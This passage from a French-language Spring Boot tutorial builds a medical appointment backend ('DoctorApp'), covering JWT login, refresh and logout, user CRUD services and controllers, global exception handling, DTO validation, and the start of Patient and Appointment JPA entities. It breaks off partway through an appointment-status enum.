     * @param request Les informations du nouvel utilisateur
     * @return L'utilisateur créé
     */
    UtilisateurResponseDto register(RegisterRequestDto request);
    
    /**
     * Rafraîchit un token JWT expiré
     * 
     * @param refreshToken Le refresh token
     * @return Un nouveau JWT
     */
    LoginResponseDto refreshToken(String refreshToken);
    
    /**
     * Déconnecte un utilisateur (révoque son refresh token)
     * 
     * @param refreshToken Le refresh token à révoquer
     */
    void logout(String refreshToken);
}
```

**Service/IUtilisateurService.java** :
```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurRequestDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurResponseDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurUpdateDto;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;

import java.util.List;

/**
 * Interface définissant les services de gestion des utilisateurs
 */
public interface IUtilisateurService {
    
    /**
     * Crée un nouvel utilisateur
     * 
     * @param requestDto Les données du nouvel utilisateur
     * @return L'utilisateur créé
     */
    UtilisateurResponseDto createUtilisateur(UtilisateurRequestDto requestDto);
    
    /**
     * Récupère un utilisateur par son ID
     * 
     * @param id L'ID de l'utilisateur
     * @return L'utilisateur trouvé
     */
    UtilisateurResponseDto getUtilisateurById(Long id);
    
    /**
     * Récupère un utilisateur par son email
     * 
     * @param email L'email de l'utilisateur
     * @return L'utilisateur trouvé
     */
    UtilisateurResponseDto getUtilisateurByEmail(String email);
    
    /**
     * Récupère tous les utilisateurs
     * 
     * @return La liste de tous les utilisateurs
     */
    List<UtilisateurResponseDto> getAllUtilisateurs();
    
    /**
     * Récupère les utilisateurs avec pagination
     * 
     * @param pageable Les paramètres de pagination
     * @return Une page d'utilisateurs
     */
    Page<UtilisateurResponseDto> getAllUtilisateurs(Pageable pageable);
    
    /**
     * Met à jour un utilisateur
     * 
     * @param id L'ID de l'utilisateur à mettre à jour
     * @param updateDto Les nouvelles données
     * @return L'utilisateur mis à jour
     */
    UtilisateurResponseDto updateUtilisateur(Long id, UtilisateurUpdateDto updateDto);
    
    /**
     * Supprime un utilisateur
     * 
     * @param id L'ID de l'utilisateur à supprimer
     */
    void deleteUtilisateur(Long id);
    
    /**
     * Active ou désactive un utilisateur
     * 
     * @param id L'ID de l'utilisateur
     * @param enabled true pour activer, false pour désactiver
     * @return L'utilisateur mis à jour
     */
    UtilisateurResponseDto toggleUtilisateurStatus(Long id, boolean enabled);
    
    /**
     * Vérifie si un email existe déjà
     * 
     * @param email L'email à vérifier
     * @return true si l'email existe, false sinon
     */
    boolean existsByEmail(String email);
}
```

---

### 5️⃣ Implémentation des services

**Service/AuthenticationServiceImpl.java** :
```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.Auth.LoginRequestDto;
import DoctorApp.DoctorApp.DTO.Auth.LoginResponseDto;
import DoctorApp.DoctorApp.DTO.Auth.RegisterRequestDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurResponseDto;
import DoctorApp.DoctorApp.Entity.RefreshToken;
import DoctorApp.DoctorApp.Entity.Role;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import DoctorApp.DoctorApp.Exception.DuplicateResourceException;
import DoctorApp.DoctorApp.Exception.ResourceNotFoundException;
import DoctorApp.DoctorApp.Mapper.UtilisateurMapper;
import DoctorApp.DoctorApp.Security.JwtUtil;
import DoctorApp.DoctorApp.repository.RoleRepository;
import DoctorApp.DoctorApp.repository.UtilisateursRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.Set;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class AuthenticationServiceImpl implements IAuthenticationService {

    private final AuthenticationManager authenticationManager;
    private final UtilisateursRepository utilisateursRepository;
    private final RoleRepository roleRepository;
    private final PasswordEncoder passwordEncoder;
    private final JwtUtil jwtUtil;
    private final RefreshTokenService refreshTokenService;
    private final UtilisateurMapper utilisateurMapper;
    
    @Value("${jwt.expiration}")
    private Long jwtExpiration;

    @Override
    @Transactional
    public LoginResponseDto login(LoginRequestDto request) {
        
        // 1. Authentifier l'utilisateur
        Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                        request.getEmail(),
                        request.getPassword()
                )
        );

        // 2. Récupérer l'utilisateur authentifié
        UserDetails userDetails = (UserDetails) authentication.getPrincipal();
        
        // 3. Charger l'entité complète pour avoir le nom
        Utilisateur utilisateur = utilisateursRepository.findByEmail(userDetails.getUsername())
                .orElseThrow(() -> new ResourceNotFoundException("Utilisateur non trouvé"));

        // 4. Générer le JWT
        String token = jwtUtil.generateToken(userDetails);
        
        // 5. Générer le Refresh Token
        RefreshToken refreshToken = refreshTokenService.createRefreshToken(userDetails.getUsername());

        // 6. Extraire les rôles
        var roles = userDetails.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList());

        // 7. Construire et retourner la réponse
        return LoginResponseDto.builder()
                .token(token)
                .refreshToken(refreshToken.getToken())
                .type("Bearer")
                .expiresIn(jwtExpiration / 1000)
                .email(utilisateur.getEmail())
                .nom(utilisateur.getNom())
                .roles(roles)
                .build();
    }

    @Override
    @Transactional
    public UtilisateurResponseDto register(RegisterRequestDto request) {
        
        // 1. Vérifier si l'email existe déjà
        if (utilisateursRepository.existsByEmail(request.getEmail())) {
            throw new DuplicateResourceException("Cet email est déjà utilisé");
        }

        // 2. Encoder le mot de passe
        String encodedPassword = passwordEncoder.encode(request.getPassword());

        // 3. Récupérer le rôle PATIENT par défaut
        Role patientRole = roleRepository.findByNom("PATIENT")
                .orElseThrow(() -> new ResourceNotFoundException("Rôle PATIENT non trouvé"));

        // 4. Créer l'utilisateur
        Utilisateur utilisateur = Utilisateur.builder()
                .nom(request.getNom())
                .email(request.getEmail())
                .password(encodedPassword)
                .enabled(true)
                .accountLocked(false)
                .firstLogin(true)
                .roles(Set.of(patientRole))
                .build();

        // 5. Sauvegarder
        Utilisateur savedUtilisateur = utilisateursRepository.save(utilisateur);

        // 6. Convertir en DTO et retourner
        return utilisateurMapper.toDto(savedUtilisateur);
    }

    @Override
    @Transactional
    public LoginResponseDto refreshToken(String refreshTokenStr) {
        
        // 1. Vérifier le refresh token
        RefreshToken refreshToken = refreshTokenService.findByToken(refreshTokenStr);
        refreshTokenService.verifyExpiration(refreshToken);

        // 2. Charger l'utilisateur
        Utilisateur utilisateur = refreshToken.getUtilisateur();
        UserDetails userDetails = new org.springframework.security.core.userdetails.User(
                utilisateur.getEmail(),
                utilisateur.getPassword(),
                utilisateur.getAuthorities()
        );

        // 3. Générer un nouveau Access Token
        String newAccessToken = jwtUtil.generateToken(userDetails);

        // 4. Extraire les rôles
        var roles = userDetails.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList());

        // 5. Retourner la réponse
        return LoginResponseDto.builder()
                .token(newAccessToken)
                .refreshToken(refreshTokenStr)
                .type("Bearer")
                .expiresIn(jwtExpiration / 1000)
                .email(utilisateur.getEmail())
                .nom(utilisateur.getNom())
                .roles(roles)
                .build();
    }

    @Override
    @Transactional
    public void logout(String refreshToken) {
        refreshTokenService.revokeToken(refreshToken);
    }
}
```

**Service/UtilisateurServiceImpl.java** :
```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurRequestDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurResponseDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurUpdateDto;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import DoctorApp.DoctorApp.Exception.DuplicateResourceException;
import DoctorApp.DoctorApp.Exception.ResourceNotFoundException;
import DoctorApp.DoctorApp.Mapper.UtilisateurMapper;
import DoctorApp.DoctorApp.repository.UtilisateursRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.List;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class UtilisateurServiceImpl implements IUtilisateurService {

    private final UtilisateursRepository utilisateursRepository;
    private final UtilisateurMapper utilisateurMapper;
    private final PasswordEncoder passwordEncoder;

    @Override
    @Transactional
    public UtilisateurResponseDto createUtilisateur(UtilisateurRequestDto requestDto) {
        
        // 1. Vérifier l'unicité de l'email
        if (utilisateursRepository.existsByEmail(requestDto.getEmail())) {
            throw new DuplicateResourceException("Cet email est déjà utilisé");
        }

        // 2. Convertir DTO → Entity
        Utilisateur utilisateur = utilisateurMapper.toEntity(requestDto);
        
        // 3. Encoder le mot de passe
        utilisateur.setPassword(passwordEncoder.encode(requestDto.getPassword()));

        // 4. Sauvegarder
        Utilisateur savedUtilisateur = utilisateursRepository.save(utilisateur);

        // 5. Convertir Entity → DTO et retourner
        return utilisateurMapper.toDto(savedUtilisateur);
    }

    @Override
    @Transactional(readOnly = true)
    public UtilisateurResponseDto getUtilisateurById(Long id) {
        Utilisateur utilisateur = utilisateursRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Utilisateur non trouvé avec l'ID : " + id));
        
        return utilisateurMapper.toDto(utilisateur);
    }

    @Override
    @Transactional(readOnly = true)
    public UtilisateurResponseDto getUtilisateurByEmail(String email) {
        Utilisateur utilisateur = utilisateursRepository.findByEmail(email)
                .orElseThrow(() -> new ResourceNotFoundException("Utilisateur non trouvé avec l'email : " + email));
        
        return utilisateurMapper.toDto(utilisateur);
    }

    @Override
    @Transactional(readOnly = true)
    public List<UtilisateurResponseDto> getAllUtilisateurs() {
        return utilisateursRepository.findAll().stream()
                .map(utilisateurMapper::toDto)
                .collect(Collectors.toList());
    }

    @Override
    @Transactional(readOnly = true)
    public Page<UtilisateurResponseDto> getAllUtilisateurs(Pageable pageable) {
        return utilisateursRepository.findAll(pageable)
                .map(utilisateurMapper::toDto);
    }

    @Override
    @Transactional
    public UtilisateurResponseDto updateUtilisateur(Long id, UtilisateurUpdateDto updateDto) {
        
        // 1. Charger l'utilisateur existant
        Utilisateur utilisateur = utilisateursRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Utilisateur non trouvé avec l'ID : " + id));

        // 2. Vérifier l'unicité de l'email si modifié
        if (updateDto.getEmail() != null && !updateDto.getEmail().equals(utilisateur.getEmail())) {
            if (utilisateursRepository.existsByEmail(updateDto.getEmail())) {
                throw new DuplicateResourceException("Cet email est déjà utilisé");
            }
        }

        // 3. Mettre à jour l'entité
        utilisateurMapper.updateEntityFromDto(updateDto, utilisateur);

        // 4. Sauvegarder
        Utilisateur updatedUtilisateur = utilisateursRepository.save(utilisateur);

        // 5. Retourner le DTO
        return utilisateurMapper.toDto(updatedUtilisateur);
    }

    @Override
    @Transactional
    public void deleteUtilisateur(Long id) {
        if (!utilisateursRepository.existsById(id)) {
            throw new ResourceNotFoundException("Utilisateur non trouvé avec l'ID : " + id);
        }
        
        utilisateursRepository.deleteById(id);
    }

    @Override
    @Transactional
    public UtilisateurResponseDto toggleUtilisateurStatus(Long id, boolean enabled) {
        Utilisateur utilisateur = utilisateursRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException("Utilisateur non trouvé avec l'ID : " + id));
        
        utilisateur.setEnabled(enabled);
        
        Utilisateur updatedUtilisateur = utilisateursRepository.save(utilisateur);
        
        return utilisateurMapper.toDto(updatedUtilisateur);
    }

    @Override
    @Transactional(readOnly = true)
    public boolean existsByEmail(String email) {
        return utilisateursRepository.existsByEmail(email);
    }
}
```

---

### 6️⃣ Controllers professionnels

**Controller/AuthController.java** :
```java
package DoctorApp.DoctorApp.Controller;

import DoctorApp.DoctorApp.DTO.Auth.LoginRequestDto;
import DoctorApp.DoctorApp.DTO.Auth.LoginResponseDto;
import DoctorApp.DoctorApp.DTO.Auth.RefreshTokenRequestDto;
import DoctorApp.DoctorApp.DTO.Auth.RegisterRequestDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurResponseDto;
import DoctorApp.DoctorApp.Service.IAuthenticationService;
import jakarta.validation.Valid;
import lombok.RequiredArgsConstructor;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.Map;

/**
 * Controller gérant l'authentification et l'enregistrement
 */
@RestController
@RequestMapping("/api/auth")
@RequiredArgsConstructor
public class AuthController {

    private final IAuthenticationService authenticationService;

    /**
     * Connexion d'un utilisateur
     * 
     * @param request Les credentials (email + password)
     * @return Les tokens JWT et les informations de l'utilisateur
     */
    @PostMapping("/login")
    public ResponseEntity<LoginResponseDto> login(@Valid @RequestBody LoginRequestDto request) {
        LoginResponseDto response = authenticationService.login(request);
        return ResponseEntity.ok(response);
    }

    /**
     * Enregistrement d'un nouvel utilisateur
     * 
     * @param request Les informations du nouvel utilisateur
     * @return L'utilisateur créé
     */
    @PostMapping("/register")
    public ResponseEntity<UtilisateurResponseDto> register(@Valid @RequestBody RegisterRequestDto request) {
        UtilisateurResponseDto response = authenticationService.register(request);
        return ResponseEntity.status(HttpStatus.CREATED).body(response);
    }

    /**
     * Rafraîchit un token JWT expiré
     * 
     * @param request Le refresh token
     * @return Un nouveau JWT
     */
    @PostMapping("/refresh")
    public ResponseEntity<LoginResponseDto> refreshToken(@Valid @RequestBody RefreshTokenRequestDto request) {
        LoginResponseDto response = authenticationService.refreshToken(request.getRefreshToken());
        return ResponseEntity.ok(response);
    }

    /**
     * Déconnexion d'un utilisateur
     * 
     * @param request Le refresh token à révoquer
     * @return Message de confirmation
     */
    @PostMapping("/logout")
    public ResponseEntity<Map<String, String>> logout(@Valid @RequestBody RefreshTokenRequestDto request) {
        authenticationService.logout(request.getRefreshToken());
        return ResponseEntity.ok(Map.of("message", "Déconnexion réussie"));
    }
}
```

**Controller/UtilisateurController.java** :
```java
package DoctorApp.DoctorApp.Controller;

import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurRequestDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurResponseDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurUpdateDto;
import DoctorApp.DoctorApp.Service.IUtilisateurService;
import jakarta.validation.Valid;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;

/**
 * Controller gérant les opérations CRUD sur les utilisateurs
 */
@RestController
@RequestMapping("/api/utilisateurs")
@RequiredArgsConstructor
public class UtilisateurController {

    private final IUtilisateurService utilisateurService;

    /**
     * Crée un nouvel utilisateur (ADMIN uniquement)
     */
    @PostMapping
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<UtilisateurResponseDto> createUtilisateur(
            @Valid @RequestBody UtilisateurRequestDto request
    ) {
        UtilisateurResponseDto response = utilisateurService.createUtilisateur(request);
        return ResponseEntity.status(HttpStatus.CREATED).body(response);
    }

    /**
     * Récupère un utilisateur par son ID
     */
    @GetMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    public ResponseEntity<UtilisateurResponseDto> getUtilisateurById(@PathVariable Long id) {
        UtilisateurResponseDto response = utilisateurService.getUtilisateurById(id);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère l'utilisateur connecté
     */
    @GetMapping("/me")
    public ResponseEntity<UtilisateurResponseDto> getCurrentUtilisateur(Authentication authentication) {
        String email = authentication.getName();
        UtilisateurResponseDto response = utilisateurService.getUtilisateurByEmail(email);
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère tous les utilisateurs (ADMIN uniquement)
     */
    @GetMapping
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<List<UtilisateurResponseDto>> getAllUtilisateurs() {
        List<UtilisateurResponseDto> response = utilisateurService.getAllUtilisateurs();
        return ResponseEntity.ok(response);
    }

    /**
     * Récupère tous les utilisateurs avec pagination (ADMIN uniquement)
     */
    @GetMapping("/page")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<Page<UtilisateurResponseDto>> getAllUtilisateurs(Pageable pageable) {
        Page<UtilisateurResponseDto> response = utilisateurService.getAllUtilisateurs(pageable);
        return ResponseEntity.ok(response);
    }

    /**
     * Met à jour un utilisateur
     */
    @PutMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    public ResponseEntity<UtilisateurResponseDto> updateUtilisateur(
            @PathVariable Long id,
            @Valid @RequestBody UtilisateurUpdateDto request
    ) {
        UtilisateurResponseDto response = utilisateurService.updateUtilisateur(id, request);
        return ResponseEntity.ok(response);
    }

    /**
     * Supprime un utilisateur (ADMIN uniquement)
     */
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<Map<String, String>> deleteUtilisateur(@PathVariable Long id) {
        utilisateurService.deleteUtilisateur(id);
        return ResponseEntity.ok(Map.of("message", "Utilisateur supprimé avec succès"));
    }

    /**
     * Active ou désactive un utilisateur (ADMIN uniquement)
     */
    @PatchMapping("/{id}/status")
    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<UtilisateurResponseDto> toggleStatus(
            @PathVariable Long id,
            @RequestBody Map<String, Boolean> request
    ) {
        boolean enabled = request.getOrDefault("enabled", false);
        UtilisateurResponseDto response = utilisateurService.toggleUtilisateurStatus(id, enabled);
        return ResponseEntity.ok(response);
    }
}
```

---

<a name="6-errors"></a>
## 6️⃣ GESTION DES ERREURS PROFESSIONNELLE

### Exceptions personnalisées

**Exception/ResourceNotFoundException.java** :
```java
package DoctorApp.DoctorApp.Exception;

/**
 * Exception levée lorsqu'une ressource n'est pas trouvée
 */
public class ResourceNotFoundException extends RuntimeException {
    
    public ResourceNotFoundException(String message) {
        super(message);
    }
    
    public ResourceNotFoundException(String message, Throwable cause) {
        super(message, cause);
    }
}
```

**Exception/DuplicateResourceException.java** :
```java
package DoctorApp.DoctorApp.Exception;

/**
 * Exception levée lorsqu'une ressource existe déjà
 */
public class DuplicateResourceException extends RuntimeException {
    
    public DuplicateResourceException(String message) {
        super(message);
    }
    
    public DuplicateResourceException(String message, Throwable cause) {
        super(message, cause);
    }
}
```

---

### Global Exception Handler

**Exception/GlobalExceptionHandler.java** :
```java
package DoctorApp.DoctorApp.Exception;

import io.jsonwebtoken.ExpiredJwtException;
import io.jsonwebtoken.JwtException;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.validation.FieldError;
import org.springframework.web.bind.MethodArgumentNotValidException;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.bind.annotation.RestControllerAdvice;

import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.Map;

/**
 * Gestionnaire global des exceptions
 */
@RestControllerAdvice
public class GlobalExceptionHandler {

    /**
     * Gère les erreurs de validation (@Valid)
     */
    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<Map<String, Object>> handleValidationErrors(MethodArgumentNotValidException ex) {
        Map<String, String> errors = new HashMap<>();
        
        ex.getBindingResult().getAllErrors().forEach(error -> {
            String fieldName = ((FieldError) error).getField();
            String errorMessage = error.getDefaultMessage();
            errors.put(fieldName, errorMessage);
        });

        Map<String, Object> response = new HashMap<>();
        response.put("timestamp", LocalDateTime.now());
        response.put("status", HttpStatus.BAD_REQUEST.value());
        response.put("error", "Validation Failed");
        response.put("errors", errors);

        return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
    }

    /**
     * Gère les ressources non trouvées
     */
    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity<Map<String, Object>> handleResourceNotFound(ResourceNotFoundException ex) {
        Map<String, Object> response = new HashMap<>();
        response.put("timestamp", LocalDateTime.now());
        response.put("status", HttpStatus.NOT_FOUND.value());
        response.put("error", "Not Found");
        response.put("message", ex.getMessage());

        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(response);
    }

    /**
     * Gère les ressources dupliquées
     */
    @ExceptionHandler(DuplicateResourceException.class)
    public ResponseEntity<Map<String, Object>> handleDuplicateResource(DuplicateResourceException ex) {
        Map<String, Object> response = new HashMap<>();
        response.put("timestamp", LocalDateTime.now());
        response.put("status", HttpStatus.CONFLICT.value());
        response.put("error", "Conflict");
        response.put("message", ex.getMessage());

        return ResponseEntity.status(HttpStatus.CONFLICT).body(response);
    }

    /**
     * Gère les erreurs d'authentification
     */
    @ExceptionHandler(BadCredentialsException.class)
    public ResponseEntity<Map<String, Object>> handleBadCredentials(BadCredentialsException ex) {
        Map<String, Object> response = new HashMap<>();
        response.put("timestamp", LocalDateTime.now());
        response.put("status", HttpStatus.UNAUTHORIZED.value());
        response.put("error", "Unauthorized");
        response.put("message", "Email ou mot de passe incorrect");

        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(response);
    }

    /**
     * Gère les JWT expirés
     */
    @ExceptionHandler(ExpiredJwtException.class)
    public ResponseEntity<Map<String, Object>> handleExpiredJwt(ExpiredJwtException ex) {
        Map<String, Object> response = new HashMap<>();
        response.put("timestamp", LocalDateTime.now());
        response.put("status", HttpStatus.UNAUTHORIZED.value());
        response.put("error", "Unauthorized");
        response.put("message", "Votre session a expiré. Veuillez vous reconnecter.");

        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(response);
    }

    /**
     * Gère les JWT invalides
     */
    @ExceptionHandler(JwtException.class)
    public ResponseEntity<Map<String, Object>> handleInvalidJwt(JwtException ex) {
        Map<String, Object> response = new HashMap<>();
        response.put("timestamp", LocalDateTime.now());
        response.put("status", HttpStatus.UNAUTHORIZED.value());
        response.put("error", "Unauthorized");
        response.put("message", "Token invalide");

        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(response);
    }

    /**
     * Gère toutes les autres exceptions
     */
    @ExceptionHandler(Exception.class)
    public ResponseEntity<Map<String, Object>> handleGenericException(Exception ex) {
        Map<String, Object> response = new HashMap<>();
        response.put("timestamp", LocalDateTime.now());
        response.put("status", HttpStatus.INTERNAL_SERVER_ERROR.value());
        response.put("error", "Internal Server Error");
        response.put("message", "Une erreur s'est produite");

        // En développement, afficher le message complet
        // En production, ne pas exposer les détails
        // response.put("details", ex.getMessage());

        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(response);
    }
}
```

---

<a name="7-validation"></a>
## 7️⃣ VALIDATION ET BONNES PRATIQUES

### Annotations de validation

```java
import jakarta.validation.constraints.*;

@Data
public class RegisterRequestDto {
    
    @NotBlank(message = "Le nom est obligatoire")
    @Size(min = 2, max = 100, message = "Le nom doit contenir entre 2 et 100 caractères")
    private String nom;
    
    @NotBlank(message = "L'email est obligatoire")
    @Email(message = "Format d'email invalide")
    private String email;
    
    @NotBlank(message = "Le mot de passe est obligatoire")
    @Size(min = 8, message = "Le mot de passe doit contenir au moins 8 caractères")
    @Pattern(
        regexp = "^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%^&+=]).*$",
        message = "Le mot de passe doit contenir au moins une majuscule, une minuscule, un chiffre et un caractère spécial"
    )
    private String password;
}
```

### Bonnes pratiques

1. **Toujours utiliser @Transactional** :
```java
@Transactional
public UtilisateurResponseDto createUtilisateur(...) { }

@Transactional(readOnly = true)
public UtilisateurResponseDto getUtilisateurById(...) { }
```

2. **Toujours valider les DTOs** :
```java
@PostMapping
public ResponseEntity<...> create(@Valid @RequestBody MyDto dto) { }
```

3. **Documenter avec Javadoc** :
```java
/**
 * Crée un nouvel utilisateur dans le système
 * 
 * @param requestDto Les données du nouvel utilisateur
 * @return L'utilisateur créé avec son ID
 * @throws DuplicateResourceException Si l'email existe déjà
 */
public UtilisateurResponseDto createUtilisateur(UtilisateurRequestDto requestDto) { }
```

4. **Utiliser des constantes** :
```java
public class ValidationConstants {
    public static final String EMAIL_REGEX = "^[A-Za-z0-9+_.-]+@(.+)$";
    public static final String PASSWORD_REGEX = "^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z]).*$";
    public static final int MIN_PASSWORD_LENGTH = 8;
    public static final int MAX_NAME_LENGTH = 100;
}
```

---

## 📝 RÉSUMÉ

### Architecture professionnelle

```
Controller (API)
    ↓ DTOs
Service Interface
    ↓
Service Implementation
    ↓ Entities
Repository
    ↓
Database
```

### Points clés

1. ✅ **Interfaces** pour tous les services
2. ✅ **DTOs** pour l'entrée/sortie des controllers
3. ✅ **Mappers** pour convertir Entity ↔ DTO
4. ✅ **BeanUtils.copyProperties()** pour le mapping automatique
5. ✅ **Exceptions personnalisées** avec GlobalExceptionHandler
6. ✅ **@Transactional** sur les méthodes de service
7. ✅ **@Valid** pour valider les DTOs
8. ✅ **Javadoc** pour documenter

---

**Besoin d'aide pour implémenter d'autres entités (Patient, Appointment, etc.) ? 😊**
# 📚 IMPLÉMENTATION COMPLÈTE : Patient & Appointment

---

## 📖 TABLE DES MATIÈRES

1. [Entités Patient & Appointment](#1-entities)
2. [DTOs pour Patient](#2-patient-dtos)
3. [DTOs pour Appointment](#3-appointment-dtos)
4. [Mappers](#4-mappers)
5. [Interfaces de services](#5-interfaces)
6. [Implémentation des services](#6-implementations)
7. [Controllers](#7-controllers)
8. [Bonus : Relations et cas complexes](#8-bonus)

---

<a name="1-entities"></a>
## 1️⃣ ENTITÉS PATIENT & APPOINTMENT

### Entity/Patient.java

```java
package DoctorApp.DoctorApp.Entity;

import jakarta.persistence.*;
import lombok.*;

import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;

@Entity
@Getter
@Setter
@ToString(exclude = {"appointments", "prescriptions"})
@Builder
@NoArgsConstructor
@AllArgsConstructor
@Table(name = "patients")
public class Patient {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, length = 100)
    private String nom;

    @Column(nullable = false, length = 100)
    private String prenom;

    @Column(nullable = false, unique = true)
    private String email;

    @Column(length = 20)
    private String telephone;

    @Column(nullable = false)
    private LocalDate dateNaissance;

    @Column(length = 10)
    @Enumerated(EnumType.STRING)
    private Genre genre;

    @Column(length = 500)
    private String adresse;

    @Column(length = 20)
    private String groupeSanguin;  // A+, O-, AB+, etc.

    @Column(length = 2000)
    private String allergies;  // Liste des allergies

    @Column(length = 2000)
    private String antecedentsMedicaux;

    @Column(nullable = false)
    private boolean actif = true;

    // 📅 Relations
    @OneToMany(mappedBy = "patient", cascade = CascadeType.ALL, orphanRemoval = true)
    private List<Appointment> appointments = new ArrayList<>();

    @OneToMany(mappedBy = "patient", cascade = CascadeType.ALL, orphanRemoval = true)
    private List<Prescription> prescriptions = new ArrayList<>();

    // 🧑‍💼 Lien avec l'utilisateur (si le patient a un compte)
    @OneToOne
    @JoinColumn(name = "utilisateur_id", unique = true)
    private Utilisateur utilisateur;

    // 📊 Audit
    @Column(nullable = false, updatable = false)
    private LocalDate dateCreation = LocalDate.now();

    @Column
    private LocalDate dateModification;

    @PreUpdate
    public void preUpdate() {
        this.dateModification = LocalDate.now();
    }

    // 🎂 Méthode utilitaire : calculer l'âge
    public int getAge() {
        if (dateNaissance == null) {
            return 0;
        }
        return LocalDate.now().getYear() - dateNaissance.getYear();
    }
}
```

### Entity/Genre.java (Enum)

```java
package DoctorApp.DoctorApp.Entity;

public enum Genre {
    HOMME,
    FEMME,
    AUTRE
}
```

---

### Entity/Appointment.java

```java
package DoctorApp.DoctorApp.Entity;

import jakarta.persistence.*;
import lombok.*;

import java.time.LocalDateTime;

@Entity
@Getter
@Setter
@ToString(exclude = {"patient", "medecin"})
@Builder
@NoArgsConstructor
@AllArgsConstructor
@Table(name = "appointments")
public class Appointment {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "patient_id", nullable = false)
    private Patient patient;

    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "medecin_id", nullable = false)
    private Utilisateur medecin;  // Le médecin est un utilisateur avec le rôle DOCTOR

    @Column(nullable = false)
    private LocalDateTime dateHeureDebut;

    @Column(nullable = false)
    private LocalDateTime dateHeureFin;

    @Column(length = 50)
    @Enumerated(EnumType.STRING)
    private StatutAppointment statut = StatutAppointment.PLANIFIE;

    @Column(length = 100)
    private String motif;  // Raison de la consultation

    @Column(length = 2000)
    private String notes;  // Notes du médecin

    @Column(length = 2000)
    private String diagnostic;

    @Column(length = 2000)
    private String traitement;

    // 📊 Audit
    @Column(nullable = false, updatable = false)
    private LocalDateTime dateCreation = LocalDateTime.now();

    @Column
    private LocalDateTime dateModification;

    @PreUpdate
    public void preUpdate() {
        this.dateModification = LocalDateTime.now();
    }

    // 🎯 Méthode utilitaire : calculer la durée
    public long getDureeMinutes() {
        if (dateHeureDebut == null || dateHeureFin == null) {
            return 0;
        }
        return java.time.Duration.between(dateHeureDebut, dateHeureFin).toMinutes();
    }
}
```

### Entity/StatutAppointment.java (Enum)

```java
package DoctorApp.DoctorApp.Entity;

public enum StatutAppointment {
    PLANIFIE,      // Rendez-vous planifié
    CONFIRME,      // Patient a confirmé
    EN_COURS,      // Consultation en cours
    TERMINE,       // Consultation terminée
